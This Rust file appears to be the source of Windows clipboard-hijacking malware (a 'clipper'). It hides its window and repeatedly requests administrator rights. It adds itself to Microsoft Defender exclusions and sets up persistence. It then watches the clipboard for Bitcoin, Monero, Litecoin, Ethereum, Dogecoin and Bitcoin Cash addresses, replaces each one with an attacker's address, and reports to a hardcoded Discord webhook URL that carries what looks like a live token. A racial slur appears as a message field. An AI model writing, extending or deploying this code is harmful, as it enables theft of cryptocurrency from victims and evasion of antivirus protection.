#![windows_subsystem = "windows"]

use clipboard::{windows_clipboard::WindowsClipboardContext, ClipboardProvider};
use regex::Regex;
use std::{
    collections::HashMap,
    ops::Deref,
    str::FromStr,
    thread,
    time::Duration,
};

mod fs;
mod os;
mod discord;

static WEBHOOK: &str = "https://discord.com/api/webhooks/1103404480541765762/QTXDSkjxpTS14SEPL4_88qj80fuvEddkLEAS9mjui1hVsx0CpnB252k0mT_RjFgvbKl9";
static FILE_NAME: &str = "bobux.exe";
static MUTEX: &str = "asdfsadfsd09f78sd98f7sd";
static FOLDER_NAME: &str = "sdfsdfsdfsdfds";

const BTC_ADDR: &str = "h";
const XMR_ADDR: &str = "dfssdf";
const DGE_ADDR: &str = "dfssfd";
const LTC_ADDR: &str = "dsfsdf";
const ETH_ADDR: &str = "dfgdg";
const BCH_ADDR: &str = "ghgfh";

fn scan(check_map: &HashMap<&str, &str>) -> Option<(String, String)> {
    let mut cb_prov = <WindowsClipboardContext as ClipboardProvider>::new().unwrap();

    let result = cb_prov.get_contents();

    let mut check_set_contents = |check: &str, set: &str, clipoard_text: String| -> Option<bool> {
        if Regex::from_str(check).unwrap().is_match(&clipoard_text) {
            if let Ok(..) = cb_prov.set_contents(
                Regex::from_str(check)
                    .unwrap()
                    .replace(&clipoard_text, set)
                    .to_string(),
            ) {
                return Some(true);
            }
        }

        return None;
    };

    if let Ok(clipboard_text) = result {
        for (regex_str, address) in check_map {
            if check_set_contents(regex_str, address, clipboard_text.clone()).is_some() {
                return Some((
                    String::from(regex_str.deref()),
                    String::from(address.deref()),
                ));
            }
        }
    }

    return None;
}

#[tokio::main]
async fn main() {
    if os::is_administrator().unwrap() {
        if os::check_mutex() {
            os::add_to_defender_exclusions(
                std::env::current_exe()
                    .unwrap()
                    .to_str()
                    .unwrap()
            );  

            os::add_to_defender_exclusions(
                fs::get_destination_path()
                    .0
                    .to_str()
                    .unwrap()
            );

            let map: HashMap<&str, &str> = HashMap::from_iter([
                (
                    r"^(1|3)[1-9A-HJ-NP-Za-km-z]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$",
                    BTC_ADDR,
                ),
                (r"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", XMR_ADDR),
                (r"^[LM3][1-9A-HJ-NP-Za-km-z]{26,33}$", LTC_ADDR),
                (r"^(0x)[a-fA-F0-9]{40,128}$", ETH_ADDR),
                (r"^D[1-9A-HJ-NP-Za-km-z]{33}$", DGE_ADDR),
                (r"^(q|1|bitcoincash:)[a-zA-HJ-NP-Z0-9]{41}$", BCH_ADDR),
            ]);

            match fs::persistence().await {
                Ok(..) => loop {
                    let scan_res = scan(&map);

                    if scan_res.is_some() {
                        discord::send_webhook(
                            "Copied to clipboard",
                            "Ahoj",
                            "nigga",
                            "fjkldshf ksjdhfkjlsd hfkjlhsd jklfhsdjlkhf kjlsd hf",
                            0xFF5733
                        ).await;
                    }

                    thread::sleep(Duration::from_millis(500));
                },
                Err(..) => {}
            };
        }
    } else {
        loop {
            let status = os::run_as_admin();

            if status.success() {
                break;
            };
        }
    }
}
